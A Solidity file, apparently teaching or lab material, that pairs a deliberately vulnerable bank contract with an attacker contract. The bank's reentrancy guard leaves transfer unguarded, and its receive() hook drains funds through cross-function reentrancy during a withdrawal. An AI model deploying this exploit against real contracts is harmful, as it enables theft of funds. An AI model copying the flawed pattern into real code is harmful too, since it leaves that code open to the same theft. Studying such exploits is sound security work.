// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

contract VulnerableBank {
  mapping(address => uint256) public balances;

  uint256 private _status; // 重入锁

  // 重入锁
  modifier nonReentrant() {
      // 在第一次调用 nonReentrant 时，_status 将是 0
       require(_status == 0, "ReentrancyGuard: reentrant call");
      // 在此之后对 nonReentrant 的任何调用都将失败
      _status = 1;
      _;
      // 调用结束，将 _status 恢复为0
      _status = 0;
  }

  function deposit() external payable {
    require(msg.value > 0, "Deposit amount must ba greater than 0");
    balances[msg.sender] += msg.value;
  }

  function withdraw(uint256 _amount) external nonReentrant {
    uint256 balance = balances[msg.sender];
    require(balance >= _amount, "Insufficient balance");

    (bool success, ) = msg.sender.call{value: _amount}("");
    require(success, "Withdraw failed");

    balances[msg.sender] = balance - _amount;
  }

  function transfer(address _to, uint256 _amount) external {
    uint256 balance = balances[msg.sender];
    require(balance >= _amount, "Insufficient balance");

    balances[msg.sender] -= _amount;
    balances[_to] += _amount;
  }

  function getbalance(address _from) public view returns (uint256)  {
      return balances[_from];
  }
}
 interface IVault{
    function deposit()  external payable;
    function withdraw(uint256 _amount)  external;
    function transfer(address _to, uint256 _amount) external;
    function getbalance(address _from) external view returns (uint256);
}

contract Attack2Contract {
    address victim;
    address owner;

    constructor(address _victim, address _owner) {
        victim = _victim;
        owner = _owner;
    }

    function getaddress() public view returns (address,address){
        return (victim,owner);
    }

    function deposit() external payable {
        IVault(victim).deposit{value: msg.value}();
    }

    function withdraw(uint256 _amount) external {
        IVault(victim).withdraw(_amount);
    }

    event Transfer(address,uint256);

    receive() external payable {
        uint256 balance = IVault(victim).getbalance(address(this));
        emit Transfer(address(this),balance);
        IVault(victim).transfer(owner, balance);
    }
}
